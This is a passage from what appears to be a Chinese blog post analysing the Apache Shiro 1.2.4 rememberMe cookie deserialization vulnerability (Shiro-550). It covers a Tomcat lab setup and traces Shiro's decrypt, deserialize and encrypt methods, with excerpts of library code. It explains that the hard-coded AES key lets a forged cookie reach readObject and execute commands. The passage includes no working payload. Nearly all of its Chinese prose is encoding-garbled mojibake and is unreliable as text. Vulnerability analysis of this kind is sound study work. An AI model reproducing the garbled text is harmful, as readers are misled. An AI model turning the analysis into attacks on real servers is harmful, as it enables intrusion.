¹æ®è‡ªå·±çš„pcä¸‹è½½</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-04%20at%2014.48.46@2x.png"></p><p>æµ‹è¯•ä¸€ä¸‹tomcat</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-04%20at%2015.04.41@2x.png"></p><h2 id="IDEA-æ‰“å¼€è¿™ä¸ªé¡¹ç›®ï¼Œå»åˆ°-Settings-ç•Œé¢"><a href="#IDEA-æ‰“å¼€è¿™ä¸ªé¡¹ç›®ï¼Œå»åˆ°-Settings-ç•Œé¢" class="headerlink" title="IDEA æ‰“å¼€è¿™ä¸ªé¡¹ç›®ï¼Œå»åˆ° Settings ç•Œé¢"></a>IDEA æ‰“å¼€è¿™ä¸ªé¡¹ç›®ï¼Œå»åˆ° Settings ç•Œé¢</h2><p>ä»£ç ç›´æ¥ç”¨pç‰›çš„å³å¯ï¼ŒIDEAæ‰“å¼€è¿™ä¸ªé¡¹ç›®ç„¶åè¿›è¡Œä¸‹é¢çš„é…ç½®</p><ul><li>Pç‰›çš„é¡¹ç›®ï¼š<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></li></ul><p>å¦‚å›¾é…ç½®ï¼Œåœ¨ Add çš„æ—¶å€™é€‰æ‹© <strong>Tomcat Server</strong> è¿™ä¸€é€‰é¡¹ã€‚</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-04%20at%2014.49.22@2x.png"></p><h2 id="é…ç½®-Edit-Configurations"><a href="#é…ç½®-Edit-Configurations" class="headerlink" title="é…ç½® Edit Configurations"></a>é…ç½® Edit Configurations</h2><p>pç‰›éƒ½å¼„å¥½äº†ï¼Œé…ç½®ä¸€ä¸‹å³å¯</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-04%20at%2014.56.17@2x.png"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-04%20at%2015.13.59@2x.png"></p><p>è¿è¡Œçˆ†çº¢ä¸éœ€è¦ç®¡ï¼ŒIEDAä¼šç›´æ¥å¼¹åˆ°æˆ‘ä»¬çš„é¡µé¢</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-04%20at%2015.14.56@2x.png"></p><h1 id="0x03-åˆ†æ"><a href="#0x03-åˆ†æ" class="headerlink" title="0x03 åˆ†æ"></a>0x03 åˆ†æ</h1><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><ul><li>å‹¾é€‰ RememberMe å­—æ®µï¼Œç™»é™†æˆåŠŸçš„è¯ï¼Œè¿”å›åŒ… set-Cookie ä¼šæœ‰ rememberMe&#x3D;deleteMe å­—æ®µï¼Œè¿˜ä¼šæœ‰ rememberMe å­—æ®µï¼Œä¹‹åçš„æ‰€æœ‰è¯·æ±‚ä¸­ Cookie éƒ½ä¼šæœ‰ rememberMe å­—æ®µï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨è¿™ä¸ª rememberMe è¿›è¡Œååºåˆ—åŒ–ï¼Œä»è€Œ getshellã€‚</li></ul><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-04%20at%2015.30.22@2x.png"></p><p>Shiro1.2.4 åŠä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼ŒAES åŠ å¯†çš„å¯†é’¥é»˜è®¤<strong>ç¡¬ç¼–ç </strong>åœ¨ä»£ç é‡Œï¼ˆShiro-550ï¼‰ï¼ŒShiro 1.2.4 ä»¥ä¸Šç‰ˆæœ¬å®˜æ–¹ç§»é™¤äº†ä»£ç ä¸­çš„é»˜è®¤å¯†é’¥ï¼Œè¦æ±‚å¼€å‘è€…è‡ªå·±è®¾ç½®ï¼Œå¦‚æœå¼€å‘è€…æ²¡æœ‰è®¾ç½®ï¼Œåˆ™é»˜è®¤åŠ¨æ€ç”Ÿæˆï¼Œé™ä½äº†å›ºå®šå¯†é’¥æ³„æ¼çš„é£é™©ã€‚</p><h2 id="æ¼æ´è§’åº¦åˆ†æ-Cookie"><a href="#æ¼æ´è§’åº¦åˆ†æ-Cookie" class="headerlink" title="æ¼æ´è§’åº¦åˆ†æ Cookie"></a>æ¼æ´è§’åº¦åˆ†æ Cookie</h2><p>ç›´æ¥ä»cookieå‡ºå‘å³å¯ï¼Œcookieæ˜¯ç»è¿‡æŸç§åŠ å¯†å¹¶ä¸”<strong>çŸ¥æ™“ Shiro çš„åŠ å¯†è¿‡ç¨‹ä¹‹åï¼Œå¯ä»¥äººä¸ºæ„é€ æ¶æ„çš„ Cookie å‚æ•°ï¼Œä»è€Œå®ç°å‘½ä»¤æ‰§è¡Œçš„ç›®çš„</strong></p><ul><li>è¦æ‰¾ Cookie çš„åŠ å¯†è¿‡ç¨‹ï¼Œç›´æ¥åœ¨ IDEA é‡Œé¢å…¨å±€æœç´¢ Cookieï¼Œå»æ‰¾ Shiro åŒ…é‡Œçš„ç±»ã€‚</li></ul><p>å®šä½åˆ°<code>CookieRememberMeManager</code>è¿™ä¸ªå¤„ç†ç±»ï¼Œçœ‹ä¸€ä¸‹å„ä¸ªæ–¹æ³•å®ç°çš„ç›®çš„ï¼Œæœ€ç»ˆæ‰¾åˆ°äº†<code>getRememberedSerializedIdentity</code>è¿™ä¸ªæ–¹æ³•ï¼Œæ‰€å®ç°ç›®çš„å¦‚ä¸‹</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-keyword">protected</span> <span class="hljs-type">byte</span>[] <span class="hljs-title function_">getRememberedSerializedIdentity</span>(SubjectContext subjectContext) &#123;<br>        <span class="hljs-keyword">if</span> (!WebUtils.<span class="hljs-property">isHttp</span>(subjectContext)) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">log</span>.<span class="hljs-property">isDebugEnabled</span>()) &#123;<br>                <span class="hljs-built_in">String</span> msg = <span class="hljs-string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a servlet request and response in order to retrieve the rememberMe cookie. Returning immediately and ignoring rememberMe operation.&quot;</span>;<br>                <span class="hljs-built_in">log</span>.<span class="hljs-property">debug</span>(msg);<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            WebSubjectContext wsc = (WebSubjectContext)subjectContext;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">this</span>.<span class="hljs-property">isIdentityRemoved</span>(wsc)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                HttpServletRequest request = WebUtils.<span class="hljs-property">getHttpRequest</span>(wsc);<br>                HttpServletResponse response = WebUtils.<span class="hljs-property">getHttpResponse</span>(wsc);<br>                <span class="hljs-built_in">String</span> base64 = <span class="hljs-variable">this</span>.<span class="hljs-property">getCookie</span>().<span class="hljs-property">readValue</span>(request, response);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;deleteMe&quot;</span>.<span class="hljs-property">equals</span>(base64)) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (base64 != <span class="hljs-literal">null</span>) &#123;<br>                    base64 = <span class="hljs-variable">this</span>.<span class="hljs-property">ensurePadding</span>(base64);<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">log</span>.<span class="hljs-property">isTraceEnabled</span>()) &#123;<br>                        <span class="hljs-built_in">log</span>.<span class="hljs-property">trace</span>(<span class="hljs-string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="hljs-string">&quot;]&quot;</span>);<br>                    &#125;<br><br>                    <span class="hljs-type">byte</span>[] decoded = Base64.<span class="hljs-property">decode</span>(base64);<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">log</span>.<span class="hljs-property">isTraceEnabled</span>()) &#123;<br>                        <span class="hljs-built_in">log</span>.<span class="hljs-property">trace</span>(<span class="hljs-string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="hljs-literal">null</span> ? decoded.<span class="hljs-property">length</span> : <span class="hljs-number">0</span>) + <span class="hljs-string">&quot; bytes.&quot;</span>);<br>                    &#125;<br><br>                    <span class="hljs-keyword">return</span> decoded;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 1c">è¿™æ®µä»£ç çš„åŠŸèƒ½æ˜¯ä»Webè¯·æ±‚ä¸­è·å–è®°ä½æˆ‘çš„èº«ä»½ä¿¡æ¯ï¼š<br>é¦–å…ˆæ£€æŸ¥SubjectContextæ˜¯å¦ä¸ºHTTPç±»å‹ï¼Œå¦‚æœä¸æ˜¯åˆ™ç›´æ¥è¿”å›<span class="hljs-literal">null</span><br>æ£€æŸ¥èº«ä»½æ˜¯å¦å·²è¢«ç§»é™¤ï¼Œå¦‚æœæ˜¯åˆ™è¿”å›<span class="hljs-literal">null</span><br>ä»Cookieä¸­è¯»å–Base64ç¼–ç çš„èº«ä»½ä¿¡æ¯<br>å¦‚æœè¯»å–åˆ°<span class="hljs-string">&quot;deleteMe&quot;</span>æ ‡è¯†åˆ™è¿”å›<span class="hljs-literal">null</span><br>å¯¹è¯»å–çš„Base64å­—ç¬¦ä¸²è¿›è¡Œå¡«å……å¤„ç†å¹¶è§£ç <br>è¿”å›è§£ç åçš„å­—èŠ‚æ•°ç»„èº«ä»½ä¿¡æ¯<br></code></pre></td></tr></table></figure><p>å…ˆåˆ¤æ–­æ˜¯å¦ä¸º HTTP è¯·æ±‚ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œè·å– cookie ä¸­ rememberMe çš„å€¼ï¼Œç„¶ååˆ¤æ–­æ˜¯å¦æ˜¯ deleteMeï¼Œä¸æ˜¯åˆ™åˆ¤æ–­æ˜¯å¦æ˜¯ç¬¦åˆ base64 çš„ç¼–ç é•¿åº¦ï¼Œç„¶åå†å¯¹å…¶è¿›è¡Œ base64 è§£ç ï¼Œå°†è§£ç ç»“æœè¿”å›ã€‚</p><p>é€†å‘è·Ÿè¿›ä¸€ä¸‹ï¼Œçœ‹ä¸€ä¸‹å“ªé‡Œè°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•ï¼Œå®šä½åˆ° <code>AbstractRememberMeManager</code> è¿™ä¸ªæ¥å£çš„ <code>getRememberedPrincipals()</code> æ–¹æ³•ï¼Œ</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2006.31.42@2x.png"></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs isbl">è·å–åºåˆ—åŒ–çš„èº«ä»½æ•°æ®<br>è°ƒç”¨ <span class="hljs-function"><span class="hljs-title">getRememberedSerializedIdentity</span>(<span class="hljs-variable">subjectContext</span>) æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šä»<span class="hljs-variable">HTTP</span>è¯·æ±‚çš„<span class="hljs-variable">Cookie</span>ä¸­è¯»å–ä¹‹å‰å­˜å‚¨çš„<span class="hljs-variable">Base64</span>ç¼–ç çš„èº«ä»½ä¿¡æ¯ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ç›¸å…³<span class="hljs-variable">Cookie</span>æˆ–<span class="hljs-variable">Cookie</span>å·²è¢«æ ‡è®°ä¸ºåˆ é™¤ï¼Œåˆ™è¿”å›<span class="hljs-variable"><span class="hljs-literal">null</span></span></span><br><span class="hljs-function">æ£€æŸ¥è·å–ç»“æœ</span><br><span class="hljs-function">åˆ¤æ–­ <span class="hljs-variable">bytes</span> æ˜¯å¦ä¸º<span class="hljs-variable"><span class="hljs-literal">null</span></span>ï¼Œå¦‚æœä¸º<span class="hljs-variable"><span class="hljs-literal">null</span></span>ï¼Œè¯´æ˜æ²¡æœ‰æœ‰æ•ˆçš„è®°ä½æˆ‘ä¿¡æ¯ï¼Œç›´æ¥è¿”å›<span class="hljs-variable"><span class="hljs-literal">null</span></span></span><br><span class="hljs-function">è½¬æ¢å­—èŠ‚æ•°æ®ä¸ºèº«ä»½é›†åˆ</span><br><span class="hljs-function">è°ƒç”¨ <span class="hljs-title">convertBytesToPrincipals</span>(<span class="hljs-variable">bytes</span>) æ–¹æ³•</span><br></code></pre></td></tr></table></figure><p>è·Ÿè¿›è¿™ä¸ª<code>convertBytesToPrincipals</code>æ–¹æ³•</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">protected</span> PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.getCipherService() != <span class="hljs-literal">null</span>) &#123;<br>        bytes = <span class="hljs-keyword">this</span>.decrypt(bytes);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.deserialize(bytes);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•å°†ä¹‹å‰çš„ bytes æ•°ç»„è½¬æ¢æˆäº†è®¤è¯ä¿¡æ¯ï¼Œåœ¨ <code>convertBytesToPrincipals()</code> è¿™ä¸ªæ–¹æ³•å½“ä¸­ï¼Œå¾ˆæ˜ç¡®åœ°åšäº†ä¸¤ä»¶äº‹ï¼Œä¸€ä»¶æ˜¯ <strong>decrypt</strong> çš„è§£å¯†ï¼Œå¦ä¸€ä»¶æ˜¯ <strong>deserialize</strong> çš„ååºåˆ—åŒ–ã€‚</p><h2 id="è§£å¯†è¿‡ç¨‹ä¹‹-decrypt-æ–¹æ³•"><a href="#è§£å¯†è¿‡ç¨‹ä¹‹-decrypt-æ–¹æ³•" class="headerlink" title="è§£å¯†è¿‡ç¨‹ä¹‹ decrypt() æ–¹æ³•"></a>è§£å¯†è¿‡ç¨‹ä¹‹ <code>decrypt()</code> æ–¹æ³•</h2><p>è·Ÿè¿›è§£å¯†çš„decryptæ–¹æ³•</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">protected byte[] decrypt(byte[] <span class="hljs-keyword">encrypted</span>) &#123;<br>    byte[] serialized = <span class="hljs-keyword">encrypted</span>;<br>    CipherService cipherService = this.getCipherService();// è·å–ä¸€ä¸ªåŠ å¯†æœåŠ¡ä¹Ÿå°±æ˜¯å®ç° AOP çš„å®ç°ç±»<br>    <span class="hljs-keyword">if</span> (cipherService != <span class="hljs-keyword">null</span>) &#123;<br>        ByteSource byteSource = cipherService.decrypt(<span class="hljs-keyword">encrypted</span>, this.getDecryptionCipherKey());// å…³é”®ä»£ç ï¼Œå¦‚æœåŠ å¯†æœåŠ¡å­˜åœ¨ï¼Œåˆ™è°ƒç”¨ cipherService çš„ decrypt æ–¹æ³•è¿›è¡Œè§£å¯†ï¼Œå‚æ•°åŒ…æ‹¬ï¼š<span class="hljs-keyword">encrypted</span>: å¾…è§£å¯†çš„æ•°æ®getDecryptKey(): é€šè¿‡ getDecryptKey() æ–¹æ³•è·å–çš„è§£å¯†å¯†é’¥keyï¼Œé‡ç‚¹å…³æ³¨ä¸€ä¸‹key<br>        serialized = byteSource.getBytes();<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> serialized;<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›<code>getDecryptionCipherKey</code>è¿™ä¸ªæ–¹æ³•çœ‹ä¸€ä¸‹ï¼Œä¸€ä¸ª btye[] çš„æ–¹æ³•ï¼Œè¿”å›äº† <code>decryptionCipherKey</code>ã€‚</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2007.05.47@2x.png"></p><p>è·Ÿè¿› <code>decryptionCipherKey</code> ä¹‹åï¼ŒæŸ¥çœ‹è°è°ƒç”¨äº†å®ƒï¼Œå‘ç°æ˜¯ <code>setDecryptionCipherKey()</code> æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›è¿™ä¸ªæ–¹æ³•ï¼ŒæŸ¥çœ‹ä¸€ä¸‹å“ªé‡Œè°ƒç”¨äº† <code>setDecryptionCipherKey()</code> æ–¹æ³•</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2007.29.33@2x.png"></p><p>è®¾ç½®åŠ å¯†å’Œè§£å¯†ä½¿ç”¨çš„å¯†é’¥ã€‚è¯¥æ–¹æ³•æ¥æ”¶ä¸€ä¸ªå­—èŠ‚æ•°ç»„ç±»å‹çš„å¯†é’¥å‚æ•°ï¼Œç„¶ååˆ†åˆ«è°ƒç”¨<code>setEncryptionCipherKey()</code>å’Œ<code>setDecryptionCipherKey()</code>æ–¹æ³•ï¼Œå°†åŒä¸€ä¸ªå¯†é’¥åŒæ—¶è®¾ç½®ä¸ºåŠ å¯†å¯†é’¥å’Œè§£å¯†å¯†é’¥ã€‚é‚£ä¹ˆçœ‹ä¸€ä¸‹æ˜¯åœ¨å“ªé‡Œè°ƒç”¨äº†setCipherKeyå¹¶ä¼ å…¥çš„å‚æ•°</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2007.33.01@2x.png"></p><p>éå¸¸æ˜¾è€Œæ˜“è§çš„ï¼Œä¼ å…¥çš„å‚æ•°ä¸º <code>DEFAULT_CIPHER_KEY_BYTES</code>ï¼Œå¹¶ä¸”æ˜¯ä¸€ä¸ªå›ºå®šçš„å€¼ï¼Œæµç¨‹ä¸º</p><p><img src="https://img1.plumstar.cn/upload5image-20250805073929599.png"></p><h2 id="è§£å¯†è¿‡ç¨‹ä¹‹-deserialize-ååºåˆ—åŒ–"><a href="#è§£å¯†è¿‡ç¨‹ä¹‹-deserialize-ååºåˆ—åŒ–" class="headerlink" title="è§£å¯†è¿‡ç¨‹ä¹‹ deserialize ååºåˆ—åŒ–"></a>è§£å¯†è¿‡ç¨‹ä¹‹ <code>deserialize</code> ååºåˆ—åŒ–</h2><p>å›åˆ°ä¹‹å‰è·Ÿè¿›åˆ°<code>convertBytesToPrincipals</code>æ–¹æ³•æ—¶ï¼Œè·Ÿè¿›deserializeæ–¹æ³•</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2007.42.54@2x.png"></p><p>è·Ÿè¿›ä¸€ä¸‹ï¼Œæœ‰ä¸¤ä¸ªå®ç°æ–¹æ³•</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2007.48.51@2x.png"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2007.53.46@2x.png"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 1c">è¿™æ®µä»£ç å®ç°äº†ä¸€ä¸ªååºåˆ—åŒ–æ–¹æ³•ï¼ŒåŠŸèƒ½å¦‚ä¸‹ï¼š<br>å‚æ•°æ ¡éªŒï¼šæ£€æŸ¥è¾“å…¥çš„å­—èŠ‚æ•°ç»„æ˜¯å¦ä¸º<span class="hljs-literal">null</span>ï¼Œå¦‚æœæ˜¯åˆ™æŠ›å‡ºIllegalArgumentExceptionå¼‚å¸¸<br>æµåŒ…è£…ï¼šå°†å­—èŠ‚æ•°ç»„åŒ…è£…æˆByteArrayInputStreamï¼Œå†ç”¨BufferedInputStreamè¿›è¡Œç¼“å†²åŒ…è£…<br>ååºåˆ—åŒ–ï¼šä½¿ç”¨è‡ªå®šä¹‰çš„ClassResolvingObjectInputStreamè¯»å–å¯¹è±¡ï¼Œå°†å…¶è½¬æ¢ä¸ºæ³›å‹Tç±»å‹<br>å¼‚å¸¸å¤„ç†ï¼šå¦‚æœååºåˆ—åŒ–è¿‡ç¨‹ä¸­å‡ºç°ä»»ä½•å¼‚å¸¸ï¼Œç»Ÿä¸€æŠ›å‡ºSerializationException<br>èµ„æºæ¸…ç†ï¼šæ­£å¸¸æƒ…å†µä¸‹å…³é—­ObjectInputStreamæµå¹¶è¿”å›ååºåˆ—åŒ–ç»“æœ<br></code></pre></td></tr></table></figure><p><code>deserialize()</code> æ–¹æ³•è°ƒç”¨äº†åŸç”Ÿçš„ <code>readObject()</code>ï¼Œæ‰€ä»¥è¿™é‡Œååºåˆ—åŒ–çš„åœ°æ–¹æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„å…¥å£ç±»ï¼Œå¯ä»¥ä½œä¸ºæˆ‘ä»¬ååºåˆ—åŒ–çš„å…¥å£</p><p>è‡³æ­¤ï¼ŒShiro æ‹¿åˆ° HTTP åŒ…é‡Œçš„ Cookie çš„è§£å¯†è¿‡ç¨‹å·²ç»æ¢³ç†åœ°å¾ˆæ¸…æ¥šäº†ï¼Œæˆ‘ä»¬å†å›å¤´çœ‹ä¸€çœ‹é‚£ä¸€æ®µ Cookie æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Œä¹Ÿå°±æ˜¯åŠ å¯†è¿‡ç¨‹ã€‚</p><h2 id="åŠ å¯†è¿‡ç¨‹"><a href="#åŠ å¯†è¿‡ç¨‹" class="headerlink" title="åŠ å¯†è¿‡ç¨‹"></a>åŠ å¯†è¿‡ç¨‹</h2><ul><li>å®šä½åˆ°<code>AbstractRememberMeManager</code> æ¥å£çš„ <code>onSuccessfulLogin</code> æ–¹æ³•å¤„ï¼Œå¹¶åœ¨è¿™é‡Œæ‰“ä¸ªæ–­ç‚¹ï¼Œè¿™æ˜¯åˆ¤æ–­æ˜¯Shiroæ¡†æ¶ä¸­å¤„ç†ç”¨æˆ·ç™»å½•æˆåŠŸåçš„è¡Œä¸ºçš„æ–¹æ³•</li></ul><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * å¤„ç†ç”¨æˆ·ç™»å½•æˆåŠŸåçš„å›è°ƒæ–¹æ³•</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> subject å½“å‰è®¤è¯ä¸»ä½“å¯¹è±¡</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> token è®¤è¯ä»¤ç‰Œ</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> info è®¤è¯ä¿¡æ¯</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> void onSuccessfulLogin(Subject subject, AuthenticationToken token, AuthenticationInfo info) &#123;<br>    <span class="hljs-comment">// ç™»å½•æˆåŠŸåï¼Œé¦–å…ˆæ¸…é™¤å½“å‰èº«ä»½ä¿¡æ¯</span><br>    <span class="hljs-keyword">this</span>.forgetIdentity(subject);<br>    <br>    <span class="hljs-comment">// æ ¹æ®ä»¤ç‰Œåˆ¤æ–­æ˜¯å¦éœ€è¦è®°ä½ç”¨æˆ·èº«ä»½</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.isRememberMe(token)) &#123;<br>        <span class="hljs-comment">// å¦‚æœéœ€è¦è®°ä½èº«ä»½ï¼Œåˆ™ä¿å­˜ç”¨æˆ·èº«ä»½ä¿¡æ¯ï¼Œè°ƒç”¨rememberIdentityæ–¹æ³•</span><br>        <span class="hljs-keyword">this</span>.rememberIdentity(subject, token, info);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>        <span class="hljs-comment">// å¦‚æœä¸éœ€è¦è®°ä½èº«ä»½ä¸”è°ƒè¯•æ—¥å¿—å¼€å¯ï¼Œåˆ™è®°å½•ç›¸å…³ä¿¡æ¯</span><br>        log.debug(<span class="hljs-string">&quot;AuthenticationToken did not indicate RememberMe is requested.  RememberMe functionality will not be executed for corresponding account.&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2023.09.25@2x.png"></p><p>è¿™ä¸ªåˆ¤æ–­è¿™é‡Œï¼Œç®€å•åˆ¤æ–­ RememberMe å­—æ®µæ˜¯å¦ä¸º trueï¼Œå†è°ƒç”¨äº† <code>rememberIdentity()</code> æ–¹æ³•ï¼ŒF7 è¿›å…¥ <code>rememberIdentity()</code> æ–¹æ³•ï¼Œè¿™é‡Œä¸€ä¸²è°ƒç”¨ï¼Œä¿å­˜ç”¨æˆ·åã€‚</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2023.16.28@2x.png"></p><p>å›åˆ° <code>rememberIdentity()</code> æ–¹æ³•ï¼Œè·Ÿè¿›<code>this.rememberIdentity(subject, principals)</code></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2023.23.47@2x.png"></p><p>è¿›å…¥ <code>convertPrincipalsToBytes()</code> æ–¹æ³•ï¼Œé‡Œé¢å’Œæˆ‘ä»¬ä¹‹å‰çœ‹çš„è§£å¯†é‡Œé¢çš„ <code>convertBytesToPrincipals()</code> éå¸¸ç›¸ä¼¼ï¼Œä¸è¿‡å°†è§£å¯†å˜æˆäº†åŠ å¯†ï¼Œå°†ååºåˆ—åŒ–æ”¹æˆäº†åºåˆ—åŒ–ã€‚</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2023.23.01@2x.png"></p><p>ç»§ç»­è·Ÿè¿›åˆ°serializeæ–¹æ³•ï¼Œçœ‹ä¸€çœ¼å®ç°çš„ä»£ç ï¼Œå’Œä¹‹å‰ä¸€æ ·ååºåˆ—åŒ–æ‰¾çš„è¿‡ç¨‹ä¸€è‡´ï¼Œåºåˆ—åŒ–æœ€åå¦‚å›¾</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2023.30.10@2x.png"></p><p>å†å›åˆ°<code>convertPrincipalsToBytes</code>æ–¹æ³•ä¸­çœ‹ä¸€ä¸‹ encrypt åŠ å¯†çš„é‚£ä¸€æ®µ</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2023.31.31@2x.png"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2023.32.30@2x.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs">è¿™æ®µä»£ç å®ç°äº†ä¸€ä¸ªåŠ å¯†æ–¹æ³•ï¼ŒåŠŸèƒ½å¦‚ä¸‹ï¼š<br>æ¥æ”¶åºåˆ—åŒ–åçš„å­—èŠ‚æ•°ç»„ä½œä¸ºè¾“å…¥<br>è·å–åŠ å¯†æœåŠ¡å®ä¾‹<br>å¦‚æœåŠ å¯†æœåŠ¡å­˜åœ¨ï¼Œåˆ™ä½¿ç”¨è¯¥æœåŠ¡å’ŒåŠ å¯†å¯†é’¥å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†<br>è¿”å›åŠ å¯†åçš„å­—èŠ‚æ•°ç»„<br>æ ¸å¿ƒé€»è¾‘æ˜¯ï¼šæœ‰åŠ å¯†æœåŠ¡å°±åŠ å¯†ï¼Œæ²¡æœ‰å°±ç›´æ¥è¿”å›åŸæ•°æ®<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä¼ 